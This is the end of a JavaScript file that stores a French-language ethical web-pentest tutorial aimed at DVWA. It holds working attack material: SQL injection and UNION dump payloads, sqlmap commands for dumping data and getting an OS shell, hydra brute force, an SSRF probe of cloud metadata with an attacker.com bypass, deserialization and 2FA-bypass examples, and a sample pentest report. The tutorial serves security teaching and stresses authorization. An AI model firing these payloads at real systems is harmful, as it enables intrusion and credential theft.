⛔ N'UTILISEZ JAMAIS sur:
❌ Sites web sans permission
❌ Réseaux d'entreprise sans contrat
❌ Infrastructures gouvernementales
❌ Applications tierces sans autorisation
\`\`\`

## 🎯 Objectifs du Tutoriel

À la fin de ce guide, vous saurez:
- [ ] Mener une reconnaissance web complète
- [ ] Identifier les vulnérabilités OWASP Top 10
- [ ] Exploiter des failles web courantes (lab uniquement)
- [ ] Utiliser Burp Suite professionnellement
- [ ] Rédiger un rapport de pentest

**Niveau**: Intermédiaire/Avancé
**Durée**: 4-6 heures
**Cible**: Damn Vulnerable Web Application (DVWA)

## 📋 Setup de l'Environnement

### Lab Virtuel (RECOMMANDÉ)

\`\`\`bash
# 1. Installer Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# 2. Télécharger DVWA
docker pull vulnerables/web-dvwa

# 3. Lancer DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# 4. Accéder à DVWA
# URL: http://localhost
# Username: admin
# Password: password

# 5. Télécharger Kali Linux tools
sudo apt install -y nmap nikto dirb gobuster sqlmap burpsuite

# 6. Configurer proxy Burp
# Burp → Proxy → Options → Bind to port 8080
# Firefox → Network Settings → Manual proxy → localhost:8080
\`\`\`

### Alternatives de Lab
\`\`\`
• OWASP WebGoat - https://github.com/WebGoat/WebGoat
• HackTheBox Academy - https://academy.hackthebox.com
• TryHackMe - https://tryhackme.com
• PortSwigger Academy - https://portswigger.net/web-security
• PentesterLab - https://pentesterlab.com
\`\`\`

## 🔍 Phase 1: Reconnaissance (OSINT)

### Étape 1.1: Information Gathering

\`\`\`bash
# Whois lookup
whois target.com

# DNS enumeration
dig target.com ANY
nslookup -type=ANY target.com

# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com

# Reverse IP lookup
curl "https://api.hackertarget.com/reverseiplookup/?q=192.0.2.1"

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak
\`\`\`

### Étape 1.2: Technology Stack Detection

\`\`\`bash
# Wappalyzer (browser extension) - recommandé
# OU en ligne de commande:

# Whatweb
whatweb target.com -v

# Nmap service detection
nmap -sV -p80,443 target.com

# Manual fingerprinting
curl -I http://target.com
# Analyser les headers:
# Server: nginx/1.18.0
# X-Powered-By: PHP/7.4.3
\`\`\`

### Étape 1.3: Content Discovery

\`\`\`bash
# Dirb avec wordlist
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Gobuster (plus rapide)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Recherche de fichiers spécifiques
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,sql

# Recherche de sous-domaines
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt
\`\`\`

**Résultats typiques**:
\`\`\`
http://target.com/admin
http://target.com/login.php
http://target.com/backup.sql (⚠️ SENSIBLE)
http://target.com/config.php.bak (⚠️ CRITIQUE)
http://target.com/phpinfo.php (⚠️ INFO DISCLOSURE)
\`\`\`

## 🕷️ Phase 2: Scanning & Enumeration

### Étape 2.1: Nmap Scan Complet

\`\`\`bash
# Quick scan des ports courants
nmap -sV -sC target.com

# Full TCP scan (LENT - 65535 ports)
nmap -p- -T4 target.com

# UDP scan des ports critiques
nmap -sU -p 53,67,68,123,161,162 target.com

# Scan avec scripts NSE
nmap --script=http-enum,http-headers,http-methods target.com -p80,443

# Detection OS et services
nmap -A target.com
\`\`\`

**Ports Web Importants**:
\`\`\`
80    - HTTP
443   - HTTPS
8080  - HTTP Alternate
8443  - HTTPS Alternate
3000  - Node.js dev servers
5000  - Flask dev servers
8000  - Django dev servers
\`\`\`

### Étape 2.2: Nikto Vulnerability Scan

\`\`\`bash
# Scan complet
nikto -h http://target.com

# Scan avec toutes les options
nikto -h http://target.com -Tuning 123456789 -o nikto_report.html -Format html

# Options utiles:
# -Tuning 1: Interesting File / Seen in logs
# -Tuning 2: Misconfiguration / Default File
# -Tuning 3: Information Disclosure
# -Tuning 4: Injection (XSS/Script/HTML)
# -Tuning 6: Denial of Service
\`\`\`

### Étape 2.3: SSL/TLS Analysis

\`\`\`bash
# SSLyze
sslyze --regular target.com:443

# Testssl.sh (le plus complet)
./testssl.sh https://target.com

# Vérifier les ciphers faibles
nmap --script ssl-enum-ciphers -p 443 target.com

# Checker en ligne
# https://www.ssllabs.com/ssltest/
\`\`\`

## 🐛 Phase 3: Exploitation (OWASP Top 10)

### 🔴 A01: Broken Access Control

**Test d'Escalade de Privilèges**:
\`\`\`http
# 1. Accéder en tant qu'utilisateur normal
GET /profile?user_id=123 HTTP/1.1
Cookie: session=user_token_abc

# 2. Tenter d'accéder au profil admin
GET /profile?user_id=1 HTTP/1.1
Cookie: session=user_token_abc

# 3. Tenter des fonctions admin
POST /admin/delete_user HTTP/1.1
Cookie: session=user_token_abc
Content-Type: application/json

{"user_id": 456}
\`\`\`

**Test IDOR (Insecure Direct Object Reference)**:
\`\`\`bash
# Script automatisé
for i in {1..1000}; do
    curl -H "Cookie: session=user_token" \\
         "http://target.com/api/invoice?id=$i" \\
         -o "invoice_$i.pdf"
done
\`\`\`

### 🔴 A02: Cryptographic Failures

**Test de Stockage de Mots de Passe**:
\`\`\`sql
-- Si vous avez accès à la DB (via SQLi)
SELECT username, password FROM users LIMIT 10;

-- Vérifier le format:
-- MD5 (32 chars)     : 5f4dcc3b5aa765d61d8327deb882cf99 ⛔ FAIBLE
-- SHA1 (40 chars)    : 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 ⛔ FAIBLE
-- bcrypt (60 chars)  : $2y$10$... ✅ BON
-- Argon2 (variable)  : $argon2i$... ✅ EXCELLENT
\`\`\`

**Cracking Hashes**:
\`\`\`bash
# Identifier le hash
hashid -m "5f4dcc3b5aa765d61d8327deb882cf99"

# Cracker avec hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
\`\`\`

### 🔴 A03: Injection (SQL Injection)

**Test Manuel**:
\`\`\`sql
-- 1. Test de base (boolean-based)
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
admin'--

-- 2. Union-based SQLi
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--

-- 3. Time-based blind SQLi
' OR SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- 4. Error-based SQLi
' AND 1=CONVERT(int, (SELECT @@version))--
\`\`\`

**Automatisation avec SQLMap**:
\`\`\`bash
# Test de base
sqlmap -u "http://target.com/page.php?id=1"

# Avec cookie de session
sqlmap -u "http://target.com/page.php?id=1" \\
       --cookie="PHPSESSID=abc123"

# POST request
sqlmap -u "http://target.com/login.php" \\
       --data="username=admin&password=admin"

# Dump de la database
sqlmap -u "http://target.com/page.php?id=1" --dump

# Obtenir un shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
\`\`\`

### 🔴 A04: Insecure Design

**Test de Business Logic Flaws**:
\`\`\`python
# Exemple: Race condition sur un coupon de réduction

import requests
import threading

def use_coupon():
    session = requests.Session()
    # Login
    session.post("http://target.com/login", data={
        "username": "test",
        "password": "test"
    })

    # Utiliser le coupon (devrait être one-time use)
    response = session.post("http://target.com/apply_coupon", data={
        "code": "SAVE50"
    })
    print(response.text)

# Lancer 100 threads simultanément
threads = []
for i in range(100):
    t = threading.Thread(target=use_coupon)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Si l'application est vulnérable, le coupon sera appliqué plusieurs fois
\`\`\`

### 🔴 A05: Security Misconfiguration

**Checklist de Configuration**:
\`\`\`bash
# 1. Directory Listing
curl http://target.com/uploads/

# 2. Default credentials
admin:admin
admin:password
root:root
test:test

# 3. Information disclosure
http://target.com/phpinfo.php
http://target.com/.git/
http://target.com/.env
http://target.com/server-status

# 4. HTTP Methods non désirés
curl -X OPTIONS http://target.com/
curl -X TRACE http://target.com/
curl -X DELETE http://target.com/file.txt

# 5. Headers de sécurité manquants
curl -I http://target.com | grep -i "X-Frame-Options\|Content-Security-Policy\|X-Content-Type-Options"
\`\`\`

### 🔴 A06: Vulnerable Components

**Scan de Dépendances**:
\`\`\`bash
# Retire.js (JavaScript libraries)
retire --js --jspath http://target.com

# Safety (Python packages)
safety check --json

# OWASP Dependency Check
dependency-check --scan /path/to/project

# npm audit (Node.js)
npm audit

# composer audit (PHP)
composer audit
\`\`\`

### 🔴 A07: Authentication Failures

**Test de Bruteforce (AVEC THROTTLING)**:
\`\`\`bash
# Hydra avec wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
      target.com http-post-form \\
      "/login.php:username=^USER^&password=^PASS^:Invalid"

# Burp Suite Intruder (recommandé)
# 1. Capturer requête de login dans Burp
# 2. Send to Intruder
# 3. Mark password field as payload position
# 4. Add wordlist
# 5. Start attack avec throttle de 1 req/sec
\`\`\`

**2FA Bypass Tests**:
\`\`\`http
# 1. Skip 2FA page
POST /login HTTP/1.1
username=admin&password=admin123

→ GET /2fa HTTP/1.1
→ GET /dashboard HTTP/1.1  ← Direct access

# 2. Rate limiting sur 2FA
POST /verify_2fa HTTP/1.1
code=000000
code=000001
... (test tous les codes)

# 3. Response manipulation
POST /verify_2fa HTTP/1.1
code=123456

Response: {"success": false}
Modify to: {"success": true}
\`\`\`

### 🔴 A08: Software and Data Integrity Failures

**Test de Deserialization**:
\`\`\`python
# PHP Object Injection
import base64

# Payload malveillant
payload = 'O:8:"UserAuth":1:{s:5:"admin";b:1;}'
encoded = base64.b64encode(payload.encode()).decode()

# Injecter dans cookie
# Cookie: user=<base64_payload>
\`\`\`

### 🔴 A09: Logging and Monitoring Failures

**Tests**:
\`\`\`bash
# 1. Générer des erreurs et voir si elles sont loggées
sqlmap -u "http://target.com/page.php?id=1" --level=5

# 2. Test de log injection
curl "http://target.com/search?q=test%0A[CRITICAL] Fake log entry"

# 3. Vérifier rate limiting
for i in {1..1000}; do
    curl -X POST http://target.com/login \\
         -d "username=admin&password=wrong" &
done
\`\`\`

### 🔴 A10: Server-Side Request Forgery (SSRF)

**Tests SSRF**:
\`\`\`http
# 1. Test de base
GET /fetch?url=http://localhost HTTP/1.1

# 2. Accès à metadata cloud
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1

# 3. Port scanning interne
GET /fetch?url=http://192.168.1.1:22 HTTP/1.1
GET /fetch?url=http://192.168.1.1:80 HTTP/1.1
GET /fetch?url=http://192.168.1.1:3306 HTTP/1.1

# 4. Bypass de filtres
http://127.0.0.1/     → http://127.1/
http://localhost/     → http://[::1]/
http://internal.com/  → http://internal.com@attacker.com/
\`\`\`

## 📝 Phase 4: Reporting

### Structure du Rapport de Pentest

\`\`\`markdown
# RAPPORT DE TEST D'INTRUSION

**Client**: MegaCorp Inc.
**Date**: 27 octobre 2025
**Testeur**: Jean Dupont, OSCP
**Scope**: https://target.megacorp.com

## RÉSUMÉ EXÉCUTIF

**Niveau de risque global**: 🔴 ÉLEVÉ

| Sévérité | Nombre | Exemples                          |
|----------|--------|-----------------------------------|
| 🔴 Critique | 3   | SQL Injection, Auth bypass        |
| 🟠 Élevé    | 7   | XSS, CSRF, IDOR                   |
| 🟡 Moyen    | 12  | Info disclosure, Misconfig        |
| 🟢 Faible   | 8   | Headers manquants, Best practices |

**Recommandation prioritaire**: Corriger immédiatement les 3 vulnérabilités critiques avant mise en production.

## MÉTHODOLOGIE

Framework utilisé: OWASP Testing Guide v4.2 + PTES
Outils: Burp Suite Pro, Nmap, SQLMap, Custom scripts

Phases:
1. Reconnaissance (2 heures)
2. Scanning (3 heures)
3. Exploitation (8 heures)
4. Post-exploitation (2 heures)
5. Reporting (3 heures)

## VULNÉRABILITÉS DÉTAILLÉES

### 🔴 [CRITIQUE] SQL Injection dans /search.php

**CVSS 3.1**: 9.8 (Critical)
**CWE**: CWE-89
**OWASP**: A03:2021 - Injection

**Description**:
Le paramètre `q` de la page de recherche est vulnérable à une injection SQL permettant à un attaquant non authentifié d'extraire l'intégralité de la base de données.

**Preuve de concept**:
\`\`\`http
GET /search.php?q=test' UNION SELECT username,password,email FROM users-- HTTP/1.1
Host: target.megacorp.com

Response:
<div class="result">
  admin:$2y$10$E4h5...:admin@megacorp.com
  jdoe:5f4dcc3...:jdoe@megacorp.com
</div>
\`\`\`

**Impact**:
- ✗ Extraction complète de la base de données (2.3 millions de comptes)
- ✗ Accès aux mots de passe hachés (MD5 - facilement crackables)
- ✗ Possibilité de modification/suppression de données
- ✗ Potentiel d'obtenir un shell sur le serveur via INTO OUTFILE

**Remediation**:
\`\`\`php
// ❌ MAUVAIS (vulnérable)
$sql = "SELECT * FROM products WHERE name LIKE '%$q%'";

// ✅ BON (utiliser prepared statements)
$stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE :q");
$stmt->execute(['q' => "%$q%"]);
\`\`\`

**Références**:
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

---

[... Répéter pour chaque vulnérabilité ...]

## RECOMMANDATIONS GÉNÉRALES

### Court terme (0-30 jours)
1. ✓ Implémenter prepared statements sur toutes les requêtes SQL
2. ✓ Activer WAF (Web Application Firewall)
3. ✓ Forcer HTTPS avec HSTS
4. ✓ Implémenter CSP (Content Security Policy)

### Moyen terme (1-3 mois)
1. ✓ Audit de code source complet
2. ✓ Intégration de SAST/DAST dans CI/CD
3. ✓ Formation développeurs sur OWASP Top 10
4. ✓ Mise en place d'un Bug Bounty program

### Long terme (3-12 mois)
1. ✓ Programme de Secure SDLC
2. ✓ Tests d'intrusion trimestriels
3. ✓ Obtention ISO 27001
4. ✓ SOC avec monitoring 24/7

## ANNEXES
- Annexe A: Rapport SQLMap complet
- Annexe B: Screenshots des vulnérabilités
- Annexe C: Logs bruts des tests
- Annexe D: Outils et versions utilisés
\`\`\`

## 🎓 Ressources pour Aller Plus Loin

### Plateformes d'Entraînement
\`\`\`
🏆 HackTheBox - https://hackthebox.com
🎯 TryHackMe - https://tryhackme.com
🎪 PentesterLab - https://pentesterlab.com
🎓 PortSwigger Academy - https://portswigger.net/web-security
💰 HackerOne CTF - https://ctf.hacker101.com
🔐 Root Me - https://www.root-me.org
\`\`\`

### Certifications
\`\`\`
🥇 OSCP - Offensive Security Certified Professional
🥈 OSWE - Offensive Security Web Expert
🥉 eWPT - eLearnSecurity Web Penetration Tester
🏅 CEH - Certified Ethical Hacker
🎖️ GWAPT - GIAC Web Application Penetration Tester
\`\`\`

### Books
\`\`\`
📕 The Web Application Hacker's Handbook (Stuttard & Pinto)
📗 Real-World Bug Hunting (Peter Yaworski)
📘 Bug Bounty Bootcamp (Vickie Li)
📙 Web Security Testing Cookbook (Paco Hope & Ben Walther)
\`\`\`

## ✅ Checklist de Pentest Web

### Pre-Engagement
- [ ] Contrat signé avec scope défini
- [ ] Autorisation écrite obtenue
- [ ] Fenêtre de test définie
- [ ] Points de contact établis
- [ ] Lab de test configuré

### Reconnaissance
- [ ] OSINT effectué
- [ ] Subdomains énumérés
- [ ] Technology stack identifié
- [ ] Directory/file enumeration
- [ ] Google dorking effectué

### Scanning
- [ ] Port scan complet
- [ ] Service fingerprinting
- [ ] Vulnerability scan (Nikto)
- [ ] SSL/TLS analysis
- [ ] CMS detection

### Testing OWASP Top 10
- [ ] A01 - Broken Access Control testé
- [ ] A02 - Cryptographic Failures testé
- [ ] A03 - Injection (SQL, XSS, LDAP) testé
- [ ] A04 - Insecure Design testé
- [ ] A05 - Security Misconfiguration testé
- [ ] A06 - Vulnerable Components testé
- [ ] A07 - Authentication Failures testé
- [ ] A08 - Data Integrity Failures testé
- [ ] A09 - Logging Failures testé
- [ ] A10 - SSRF testé

### Exploitation
- [ ] Vulnérabilités critiques exploitées
- [ ] Preuves de concept créées
- [ ] Screenshots capturés
- [ ] Impact documenté

### Post-Exploitation
- [ ] Persistence testée
- [ ] Lateral movement testé
- [ ] Data exfiltration testée
- [ ] Privilege escalation testée

### Reporting
- [ ] Rapport rédigé
- [ ] Vulnérabilités classées (CVSS)
- [ ] Recommandations fournies
- [ ] Executive summary rédigé
- [ ] Rapport relu et validé

---
*Guide créé par CyberGuard Pro - Ethical Hacking Team*
*Dernière mise à jour: 26 octobre 2025*
        `
    }
];

// Export pour utilisation dans le système existant
if (typeof module !== 'undefined' && module.exports) {
    module.exports = enrichedBlogArticles;
}
